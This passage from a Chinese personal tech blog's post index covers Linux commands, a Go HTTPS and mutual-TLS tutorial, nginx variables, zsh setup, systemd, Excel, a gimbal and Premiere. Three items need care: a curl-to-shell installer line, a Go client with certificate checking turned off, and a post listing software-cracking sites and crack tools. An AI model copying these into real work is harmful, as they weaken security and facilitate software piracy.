-tunlp | grep 80\n\n\n# 知道进程名字反查端口\nps -ef | grep processName  #得到processID\nnetstat -anp | grep processID #p能显示出进程名和进程id, 过滤得到端口\n\n# 知道端口反查进程名字\nsudo lsof -i :80\n\n# 一个命令搞定\nsudo netstat -anp | grep processID\nsudo netstat -anp | grep processName\n```\n\n\n\n### 2.3 进程管理器\n\n```bash\n# top\ntop - 13:41:19 up 83 days,  2:53,  1 user,  load average: 0.21, 0.85, 0.72\nTasks: 148 total,   1 running, 106 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  7.0 us,  4.1 sy,  0.0 ni, 88.4 id,  0.2 wa,  0.0 hi,  0.3 si,  0.0 st\nKiB Mem :  2040116 total,   212880 free,   789056 used,  1038180 buff/cache\nKiB Swap:        0 total,        0 free,        0 used.  1040512 avail Mem\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n30844 root      20   0  572436 296072  16972 S   4.7 14.5   4235:28 kube-apiserver\n31035 root      20   0  643968  55980  20080 S   4.3  2.7   3362:32 kubelet\n30735 root      20   0 10.121g  67348  10588 S   2.3  3.3   1994:44 etcd\n```\n\n+ 第一行的参数\n\n  **10:59:22**  : 当前系统时间\n   **up 37 days, 20:48**  : 系统累积以及运行的时间\n   **3 users** : 当前用户数量\n   **load average: 0.00,0.00,0.00** : 系统负载的三个数值分别表示的是1分钟，5分钟和15分钟系统负载的平均值\n\n  当CPU完全空闲的时候，平均负荷为0；当CPU工作量饱和的时候，平均负荷为1。n个CPU的电脑，可接受的系统负荷最大为n.0。\n\n+ 第二行的参数\n\n   **Tasks： 112 total** : 进程总数\n   **1 running** : 正常运行的进程数量\n   **121 sleeping** : 休眠的进程数量\n   **0 stopped** : 停止的进程数量\n   **0 zombie** : 僵死进程数量\n\n+ 第三行的参数\n\n  **0.2 us** : 用户进程占用cpu资源的百分比\n   **0.2 sy** : 内核进程占用cpu资源的百分比\n   **0.0 ni** : 用户进程空间内改变过优先级的进程占cpu资源的百分比\n   **99.7 id** : 空闲cpu百分比\n   **0.0 wa** : 等待io的进程占cpu资源的百分比\n   **0.0 hi** : 硬中断占用cpu的百分比\n   **0.0 si**: 软中断占用的百分比\n   **0.0 st** : 虚拟机占用百分比\n\n+ 第四行的意义\n\n  **524280k total** : 交换区内存总容量\n  **0k used** : 交换区内存使用的容量\n  **524280k used**: 交换区空闲的内存容量\n  **848380k cached** : 缓存的交换区总量\n\n+ 进程的意义\n   **PID** : 进程id，标记唯一进程\n   **USER** : 进程用户名\n   **PR** : 优先级\n   **NI** : nice值。负值表示高优先级，正值表示低优先级\n   **VIRT** : 进程使用的虚拟内存的大小\n   **RES** : 指进程除去使用交换区swap的内存，使用的物理内存的大小\n   **SHR** : 进程共享内存的大小\n   **S** : process status 进程状态 。 分别有D R S T Z ,分别表示不可中断的休眠、正在运行、休眠中、暂停或者跟踪状态、僵死状态\n   **%CPU** : cpu的使用量占总cpu时间的百分比\n   **%MEM** : 进程使用的物理内存百分比\n   **TIME+** : 进程使用的CPU时间总计，精确到1/100秒\n   **COMMAND** : 命令或者进程名称\n\n\n\n# 3. 系统设置\n\n### 3.1 设置linux时间和时区\n\n```bash\n# 设置时间\ndate -s \"2015-10-25 15:00:00\"\n\n#设置时区\ntzselect  #命令只告诉你选择的时区的写法，并不会生效。\n在.bashrc添加  export TZ='Asia/Shanghai'\n```\n\n\n\n# 5. 其他\n\n### 5.1 域名查询\n\n```bash\nhost hostname [server]\n[server]：使用不是由/etc/resolv.conf文件定义的DNS服务器IP来查询某台主机的IP。\n\nhost www.baidu.com\nhost www.baidu.com 8.8.8.8\n\nhost google.com #Find the Domain IP Address\nhost -t ns google.com #Find Domain Name Servers, dns\nhost -t cname mail.google.com #Find Domain CNAME Record\nhost -t mx google.com #Find Domain MX Record\nhost -t txt google.com#Find Domain TXT Record\nhost -a google.com #Find All Information of Domain Records and Zones\n```\n\n\n\n\n\n# 10. 参考教程\n\n+ https://linuxtools-rst.readthedocs.io/zh_CN/latest/","tags":["linux"],"categories":["命令"]},{"title":"golang启动https_server","url":"%2Fp%2Fd5ecb4c4.html","content":"\n\n\n# 1. golang 实现HTTPS Web Server\n\n+ 生成私钥和证书\n\n```\nopenssl genrsa -out server.key 2048 //生成私钥\nopenssl req -new -x509 -key server.key -out server.pem -days 3650 //生成证书\n```\n<!-- more -->\n\n+ server.go\n\n```\npackage main\n\t\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServeTLS(\":8081\", \"server.pem\", \"server.key\", nil)\n}\n\t\n```\n\n通过浏览器访问：https://localhost:8081 会出现您的连接不是私密连接, 因为我们使用的是自签发的数字证书\n\t\n\n+ 客户端访问\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t//通过设置tls.Config的InsecureSkipVerify为true，client将不再对服务端的证书进行校验。\n\tts := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} \n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n\n# 2. 对服务端数字证书进行验证\n\n接下来我们来验证一下客户端对服务端数字证书进行验证:\n\n- 首先我们来建立我们自己的CA，需要生成一个CA私钥和一个CA的数字证书:\n```\nopenssl genrsa -out ca.key 2048\n\t\nopenssl req -x509 -new -nodes -key ca.key -subj \"/CN=tonybai.com\" -days 5000 -out ca.crt\n```\n\n- 接下来，生成server端的私钥，生成数字证书请求，并用我们的ca私钥签发server的数字证书：\n\n```\nopenssl genrsa -out server.key 2048\n\t\nopenssl req -new -key server.key -subj \"/CN=localhost\" -out server.csr\n\t\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000\n```\n\n- 现在我们的工作目录下有如下一些私钥和证书文件：\n\n```\nCA:\n私钥文件 ca.key\n数字证书 ca.crt\n\nServer:\n私钥文件 server.key\n数字证书 server.crt\n```\n\n+ 客户端验证服务端数字证书\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool,\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n\n# 3. 对客户端的证书进行校验(双向证书校验）\n\n+ 要对客户端数字证书进行校验，首先客户端需要先有自己的证书。\n\n```\nopenssl genrsa -out client.key 2048\n\t\nopenssl req -new -key client.key -subj \"/CN=tonybai_cn\" -out client.csr\n\t\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 5000\n```\n\n+ 首先server端需要要求校验client端的数字证书，并且加载用于校验数字证书的ca.crt，因此我们需要对server进行更加灵活的控制：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\ts := &http.Server{\n\t\tAddr:    \":8081\",\n\t\tHandler: http.HandlerFunc(handler),\n\t\tTLSConfig: &tls.Config{\n\t\t\tClientCAs:  pool,\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert, //强制校验client端证书\n\t\t},\n\t}\n\t\n\ts.ListenAndServeTLS(\"server.crt\", \"server.key\")\n}\n```\n\n+ client端变化也很大，需要加载client.key和client.crt用于server端连接时的证书校验：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tcliCrt, err := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")\n\tif err != nil {\n\t\tfmt.Println(\"Loadx509keypair err:\", err)\n\t\treturn\n\t}\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool, //client端是 RootCAs\n\t\t\tCertificates:       []tls.Certificate{cliCrt},\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```","tags":["http"],"categories":["https"]},{"title":"mac破解资源软件收集","url":"%2Fp%2F6765e5a5.html","content":"\n拒绝盗版从我做起，下面被删除的网站提供大量破解软件下载，欢迎大家监督它们。 \n\n<!-- more -->\n\n# 1. 苹果软件破解\n\n+  https://xclient.info/\n+  https://appstorrent.ru/\n+  https://www.torrentmac.net\n+  https://www.minorpatch.com\n\n+ https://www.macenjoy.co/\n\n+  https://www.macsky.net/\n+  https://nmac.to/\n+  https://www.naodai.org/\n\n\n\n### 1.1 汇总\n\n+ https://github.com/jaywcjlove/awesome-mac/blob/master/README-zh.md#%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BD%91%E7%AB%99%E9%BB%91%E5%90%8D%E5%8D%95\n\n\n\n# 2. 其他破解\n\n+ 百度云盘破解 https://github.com/proxyee-down-org/proxyee-down\n+ 百度云盘破解 https://www.baiduwp.com/ (需要安装ua switch插件,已失效)\n+ 百度云盘破解 https://github.com/b3log/baidu-netdisk-downloaderx(已失效)\n+ Jetbrains https://zhile.io/2018/08/25/jetbrains-license-server-crack.html\n+ Charles 破解  https://github.com/8enet/Charles-Crack\n+ Cleanmymac 破解 https://macbold.com/download-cleanmymac-fully-activated-free7t5/\n+ Ntfsformac破解 https://www.naodai.org/archives/50.html\n+ 小众软件: https://www.appinn.com/category   里面有比较有意思的软件和chrome插件\n","tags":["software"],"categories":["软件"]},{"title":"nginx全局变量","url":"%2Fp%2F80b24c5f.html","content":"\n### 1. 服务器相关\n\n| 变量名                | 备注                                                         | 示例                                               |\n| --------------------- | ------------------------------------------------------------ | -------------------------------------------------- |\n| `nginx_version`       | 当前运行的 Nginx 版本号                                      | 1.11.2                                             |\n| `server_port`         | 服务器端口                                                   | 8080                                               |\n| `server_addr`         | 服务器端地址                                                 | 127.0.0.1                                          |\n| `server_name`         | 服务器名称                                                   | 127.0.0.1                                          |\n| `server_protocol`     | 服务器的HTTP版本                                             | HTTP/1.0                                           |\n| `status`              | HTTP 响应代码                                                | 200                                                |\n| `time_iso8601`        | 服务器时间的 ISO 8610 格式                                   | 2018-09-02T15:14:27+08:00                          |\n| `time_local`          | 服务器时间（LOG Format 格式）                                | 02/Sep/2018:15:14:27 +0800                         |\n| `document_root`       | 当前请求的文档根目录或别名                                   | `/home/xiaowu/github/echo.xuexb.com`               |\n| `request_filename`    | 当前连接请求的文件路径，由 `root`或 `alias`指令与 URI 请求生成 | `/home/xiaowu/github/echo.xuexb.com/api/dump/path` |\n| `request_completion`  | 如果请求成功，值为”OK”，如果请求未完成或者请求不是一个范围请求的最后一部分，则为空 |                                                    |\n| `pid`                 | 工作进程的PID                                                | 1234                                               |\n| `msec`                | 当前的Unix时间戳                                             | 1535872750.954                                     |\n| `limit_rate`          | 用于设置响应的速度限制                                       | 0                                                  |\n| `pipe`                | 如果请求来自管道通信，值为“p”，否则为“.”                     | .                                                  |\n| `connection_requests` | TCP连接当前的请求数量                                        | 1                                                  |\n| `connection`          | TCP 连接的序列号                                             | 363861                                             |\n| `realpath_root`       | 当前请求的文档根目录或别名的真实路径，会将所有符号连接转换为真实路径 | /home/xiaowu/github/echo.xuexb.com                 |\n|                       \n\n<!-- more -->\n\n### 2. 客户端相关\n\n| 变量名              | 示例                                                         | 备注                                                         |\n| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| host                | echo.xuexb.com                                               | 优先级如下：HTTP请求行的主机名>”HOST”请求头字段>符合请求的服务器名 |\n| hostname            | bj01                                                         | 主机名                                                       |\n| remote_port         | 58500                                                        | 客户端端口                                                   |\n| remote_user         |                                                              | 用于HTTP基础认证服务的用户名                                 |\n| request             | GET /api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84%23123 HTTP/1.0 | 代表客户端的请求地址                                         |\n| remote_addr         | 127.0.0.1                                                    | 客户端地址                                                   |\n| request_body        |                                                              | 客户端的请求主体, 此变量可在location中使用，将请求主体通过proxy_pass, fastcgi_pass, uwsgi_pass, 和 scgi_pass传递给下一级的代理服务器 |\n| request_body_file   |                                                              | 将客户端请求主体保存在临时文件中文件处理结束后，此文件需删除如果需要之一开启此功能，需要设置client_body_in_file_only如果将次文件传递给后端的代理服务器，需要禁用request body，即设置proxy_pass_request_body off，fastcgi_pass_request_body off, uwsgi_pass_request_body off, or scgi_pass_request_body off |\n| proxy_protocol_addr |                                                              | 获取代理访问服务器的客户端地址，如果是直接访问，该值为空字符串(1.5.12) |\n| http_名称           | http_accept_language -> zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7  | 匹配任意请求头字段； 变量名中的后半部分“name”可以替换成任意请求头字段，如在配置文件中需要获取http请求头：“Accept-Language”，那么将“－”替换为下划线，大写字母替换为小写，形如：http_accept_language即可 |\n| bytes_sent          | 0                                                            | 传输给客户端的字节数 (1.3.8, 1.2.5)                          |\n| body_bytes_sent     | 0                                                            | 传输给客户端的字节数，响应头不计算在内；这个变量和Apache的mod_log_config模块中的“%B”参数保持兼容 |\n\n\n\n### 3. 客户端相关 - request headers\n\n| 变量名                           | 备注                                                         | 示例                                                         |\n| -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| `http_accept`                    | 浏览器支持的 MIME 类型                                       | `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8` |\n| `http_accept_encoding`           | 浏览器支持的压缩编码                                         | `gzip, deflate, br`                                          |\n| `http_accept_language`           | 浏览器支持的语言                                             | `zh-CN,zh;q=0.9,en;q=0.8`                                    |\n| `http_cache_control`             | 浏览器缓存                                                   | `max-age=0`                                                  |\n| `http_connection`                | 客户端与服务连接类型                                         |                                                              |\n| `http_cookie`                    | 浏览器请求 cookie                                            | `a=1; b=2`                                                   |\n| `http_host`                      | 浏览器请求 host                                              | echo.xuexb.com                                               |\n| `http_referer`                   | 浏览器来源                                                   | https://echo.xuexb.com/                                      |\n| `http_upgrade_insecure_requests` | 是一个请求首部，用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应，并且它可以成功处理 upgrade-insecure-requests CSP 指令 | 1                                                            |\n| `http_user_agent`                | 用户设备标识                                                 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36` |\n| `http_x_requested_with`          | 异步请求标识                                                 | true                                                         |\n| `http_x_forwarded_for`           | 反向代理原 IP                                                | 198.13.61.105                                                |\n\n\n\n### 4. 链接相关\n\n| 变量名           | 备注                                                         | 示例                                                       |\n| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |\n| `scheme`         | 请求使用的 WEB 协议                                          | http                                                       |\n| `uri`            | 请求中的当前 URI(不带请求参数)，可以不同于浏览器传递的 `$request_uri` 的值，它可以通过内部重定向，或者使用 `index` 指令进行修改 | `/api/dump/path`                                           |\n| `document_uri`   | 同 `$uri`                                                    | `/api/dump/path`                                           |\n| `request_uri`    | 这个变量等于包含一些客户端请求参数的原始 URI ，它无法修改    | `/api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84` |\n| `request_method` | HTTP 请求方法                                                | GET                                                        |\n| `request_time`   | 处理客户端请求使用的时间，从读取客户端的第一个字节开始计时   | 0.000                                                      |\n| `request_length` | 请求的长度（包括请求地址、请求头和请求主体）                 | 678                                                        |\n| `args`           | 请求参数                                                     | `a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84`                |\n| `query_string`   | 同 `$args`                                                   |                                                            |\n| `is_args`        | 请求中是否有参数，有则为 `?` 否则为空                        | `?`                                                        |\n| `arg_参数名`     | 请求中具体的参数                                             | `$arg_a` => `1`                                            |\n| `https`          | 如果开启了 SSL 安全模式，则为 `on` 否则为空                  | `on`                                                       |\n\n\n\n### 5. 参考资料\n\n+ https://xuexb.github.io/learn-nginx/variable/\n+ https://nginx.org/en/docs/\n","tags":["nginx"],"categories":["nginx"]},{"title":"iterm2配置zsh和常用插件","url":"%2Fp%2F6600d67c.html","content":"\n直接看效果图\n\n![1](iterm2配置zsh和常用插件/3.png)\n\n![1](iterm2配置zsh和常用插件/2.png)\n\n\n\n<!-- more -->\n\n# 1. 安装\n\n### 1.1 安装 ohmyzsh\n\n https://github.com/ohmyzsh/ohmyzsh\n\n注意安装会覆盖 `.zshrc`, 提前备份下\n\n```\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n\n`.zshrc`文件加下面配置\n\n```ini\n# ~/.zshrc\nexport ZSH=\"/Users/liuwei/.oh-my-zsh\"\n```\n\n重置下配置文件\n\n```bash\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n### 1.2  安装主题 powerlevel10k\n\nhttps://github.com/romkatv/powerlevel10k\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n# 设置主题  ~/.zshrc\nZSH_THEME=\"powerlevel10k/powerlevel10k\" \n```\n\n\n\n+ 主题配置\n\n```bash\n# ~/.zshrc\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# 在终端下执行下面的命令, 可以看到代号对应的颜色\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 1.3 安装字体\n\n下载推荐字体\n\n+ https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k\n\n也可选择其他字体安装\n\n  ```bash\n  # 几个字体仓库\n  https://github.com/powerline/fonts\n  https://github.com/gabrielelana/awesome-terminal-fonts\n  https://github.com/ryanoasis/nerd-fonts/\n  ```\n\n然后在iterm2里面，把字体改成后缀为powerline的字体就行了\n![1](iterm2配置zsh和常用插件/1.png)\n\n\n\n# 2. 插件\n\n### 2.1 git\n\n```bash\n#.zshrc\nplugins=(git)\n```\n\n### 2.2 自动补充\n\nhttps://github.com/zsh-users/zsh-autosuggestions\n\n```bash\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n#.zshrc\nplugins=(zsh-autosuggestions)\n```\n\n### 2.3 语法高亮\n\nhttps://github.com/zsh-users/zsh-syntax-highlighting\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n#.zshrc\nplugins=(zsh-syntax-highlighting)\n```\n\n\n\n# 3. 配色\n\n### 3.1 配色项目\n\n```bash\nhttps://github.com/dracula/dracula-theme/ # 选用的这个!!!好看!!!支持各种终端,吸血鬼配色\nhttps://github.com/mbadolato/iTerm2-Color-Schemes # 这上面好多, 慢慢挑\nhttps://github.com/MartinSeeler/iterm2-material-design \n```\n\n### 3.2 安装dracula\n\nhttps://github.com/dracula/iterm\n\n```bash\ngit clone https://github.com/dracula/iterm.git\n\n#Activating theme\niTerm2 > Preferences > Profiles > Colors Tab\nOpen the Color Presets... drop-down in the bottom right corner\nSelect Import... from the list\n\nSelect the Dracula.itermcolors file\nSelect the Dracula from Color Presets...\n```\n\n\n\n# 4. 遇到的问题\n\n### 4.1 图案不显示\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete' #这句话一定要在下面source之前\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n# 5. 参考资料\n\n+ [打造 Mac 下高颜值好用的终端环境](https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html)\n\n+ https://medium.com/@Clovis_app/configuration-of-a-beautiful-efficient-terminal-and-prompt-on-osx-in-7-minutes-827c29391961\n\n","tags":["iterm2"],"categories":["终端"]},{"title":"/etc/systemd/system和/lib/systemd/system的区别","url":"%2Fp%2Fc1403091.html","content":"\n\n\n# 1. 目录\n\n### 1.1 [/usr]/lib/systemd/system/ \n\n (软件包安装的单元)\n\nThe expectation is that `/lib/systemd/system` is a directory that should only contain systemd unit files which were put there by the package manager (YUM/DNF/RPM/APT/etc).\n\n### 1.2 /etc/systemd/system/\n\n(系统管理员安装的单元, 优先级更高)\n\nFiles in `/etc/systemd/system` are manually placed here by the operator of the system for ad-hoc software installations that are not in the form of a package. This would include tarball type software installations or home grown scripts.\n\n<!-- more -->\n\n# 2. 优先级\n\nsystemd的使用大幅提高了系统服务的运行效率, 而unit的文件位置一般主要有三个目录：\n\n```\n       Table 1.  Load path when running in system mode (--system).\n       ┌────────────────────────┬─────────────────────────────┐\n       │Path                    │ Description                 │\n       ├────────────────────────┼─────────────────────────────┤\n       │/etc/systemd/system     │ Local configuration         │\n       ├────────────────────────┼─────────────────────────────┤\n       │/run/systemd/system     │ Runtime units               │\n       ├────────────────────────┼─────────────────────────────┤\n       │/lib/systemd/system     │ Units of installed packages │\n       └────────────────────────┴─────────────────────────────┘\n```\n\n\n\n这三个目录的配置文件优先级依次从高到低，如果同一选项三个地方都配置了，优先级高的会覆盖优先级低的。 \n\n系统安装时，默认会将unit文件放在`/lib/systemd/system`目录。如果我们想要修改系统默认的配置，比如`nginx.service`，一般有两种方法：\n\n1. 在`/etc/systemd/system`目录下创建`nginx.service`文件，里面写上我们自己的配置。\n2. 在`/etc/systemd/system`下面创建`nginx.service.d`目录，在这个目录里面新建任何以.conf结尾的文件，然后写入我们自己的配置。推荐这种做法。\n\n`/run/systemd/system`这个目录一般是进程在运行时动态创建unit文件的目录，一般很少修改，除非是修改程序运行时的一些参数时，即Session级别的，才在这里做修改。\n\n\n\n# 3. 参考资料\n\n+ https://unix.stackexchange.com/questions/206315/whats-the-difference-between-usr-lib-systemd-system-and-etc-systemd-system\n+ https://wiki.archlinux.org/index.php/Systemd","tags":["systemd"],"categories":["命令"]},{"title":"excel制作记账本功能","url":"%2Fp%2F34a34835.html","content":"\n想用excel 实现一个简单的记账表，如下图：\n\n![1](excel制作记账本功能/1.png)\n\n<!-- more -->\n\n\n\n\n### 1. 第一行到当前行求和\n\n`=SUM(INDIRECT(\"A1:A\"&ROW()))`\n\n### 2. 除了第一列选中整列\n\n选中整列就是双击整列\n\n除了第一列不选, 那么在第二列, cmd+shift+↓, 如果有数据↓按两次\n\n### 3. 公式应用整列\n\n选中整列 ctrl+d   应用所有样式\n\n### 4. IF 函数\n\n=IF(1>2,\"判断真\",\"判断假\")\n\n### 5. 限制数字\n\n选中列, 右键数据验证, 开启\n\n### 6. 删除数据, 不删除公式\n\n软件支持，在线文档不支持。\n\n### 7. 如果前面有值, 后面自动计算,  否则显示空\n\n+ 总金额\n\n   `=IF(ISBLANK(C4),\"\",SUM(INDIRECT(\"C4:C\"&ROW()))) `  // C4是第一个数据, 对下面的列应用样式\n\n\n","tags":["excel"],"categories":["个人记录"]},{"title":"智云云鹤2_crane2教程","url":"%2Fp%2F3bad91c1.html","content":"\n\n\n### 1. 安装\n\n+ 安装电池\n+ 拧上三脚架\n\n### 2. 平衡\n\n调节平衡之前需要先认清三个轴:\n\n+ 俯仰轴   相机的右侧的那个圆圈(转动改变角度)\n\n+ 横滚轴   后方写着智云字体的那个圆圈(貌似不会转动,倾斜改变角度)\n\n+ 航向轴   手柄上方的那个圆圈(转动改变角度)\n\n  \n\n##### 2.1 调节平衡\n\n+ 先调节俯仰轴水平, 前后移动快装板, 松手水平后拧紧快装板螺丝\n+ 再调节俯仰轴垂直, 松手垂直后拧紧俯仰轴螺丝\n+ 再调节横滚轴, 松手水平后拧紧横滚轴螺丝\n+ 最后调节航向轴, 把三脚架怼着肚子,松手水平后拧紧航向轴螺丝\n\n<!-- more -->\n\n### 3. APP\n\n+ ZY Play(可以控制crane2)\n+ 智云掌上助手 (貌似只能看角度)\n\n\n\n#### 4. SONY\n\n+ 连接相机线, 先开稳定器, 再开相机\n+ camera修改相机为 sony, false(不为相机供电, 对给相机备电池)\n+ 电源键录像, 确认键拍照\n+ 跟焦不支持,可以用外置伺服跟焦器(没啥卵用)\n\n\n\n### 5. 模式\n\n##### 5.1 PF 左右跟随模式 (一直保持水平)===>需要自己控制左右转\n\n+ 俯仰和横滚锁定, 水平方向随着手柄转动\n\n+ 向上和向下改变仰角\n\n##### 5.2 L 全锁定模式 (保持水平和垂直)===>需要自己控制任何方向\n\n+ 三个轴都锁定\n\n+ 向上和向下改变仰角\n\n+ 向左和向右改变朝向\n\n##### 5.3 F 全跟随模式 (水平和垂直都活)===>控制好自己\n\n+ 横滚锁定\n+ 俯仰和朝向随手柄转动\n+ 向左和向右改变横滚角度\n\n##### 5.4 POV 第一视角模式(360度无死角)===>自己转手柄对准(难度高)\n\n+ 上下画圈旋转\n+ 手柄顺时针和逆时针转动\n+ 定器手柄顶端作定向点，手柄末端作转向点\n\n##### 5.5 V 三围梦境模式===>握紧手柄,点按钮翻转\n\n+ 前进/后退中按钮旋转\n+ 向左和向右旋转相机\n+ 即使三维梦境的拍摄效果是画面的顺/逆时针旋转，但实际稳定器的运动轨迹并非是横滚轴，而是航向轴 。\n+ 在拍摄前需注意进行相机调平，尤为是容易被忽略的航向轴调平，以便发挥稳定器的最大功率实现完美拍摄。\n\n\n\n#### 6. 配件\n\n+ 外置伺服跟焦器, 因为sony 不支持跟焦, 可以用作物理跟焦, 已挂闲鱼\n+ 鳞甲监视器, 需要另购买配件(蛇管怪手), 已挂闲鱼","tags":["photo"],"categories":["摄影"]},{"title":"pr入门教程笔记","url":"%2Fp%2Fe24658ca.html","content":"\n\n\n\n### 0. 安装\n\n+ windows\n\n+ mac\n\n### 1. 基础操作\n\n##### 1.1 软件\n\n+ 新建项目\n+ 窗口->工作区->重置\n+ 首选项->自动保存\n\n<!-- more -->\n\n##### 1.2 导入\n\n+ 双击\n+ 右键->导入\n+ 拖到文件夹->导入(提前归类好文件夹资源)\n\n##### 1.3 序列\n\n+ 手动新建序列, 如1080P 25fps….\n+ 直接通过资源来创建序列\n+ v1,v2,v3 视频段,  a1,a2,a3 音频段\n+ 视频可以开关小眼睛关闭, 音频可以m静音\n+ 可以上下推拉, 调整序列段的宽度\n+ 速度/\b持续时间 可制作升格降格, 序列前面会出现fx标识, (拍摄100ps, 降低到25ps)\n+ 序列可以拖动并入之前的系列\n\n##### 1.4 操作\n\n+ M标记 -> 剪刀裁剪 -> 波纹删除 \n+ alt 按序列段 -> 拖到 -> 复制\n\n##### 1.5 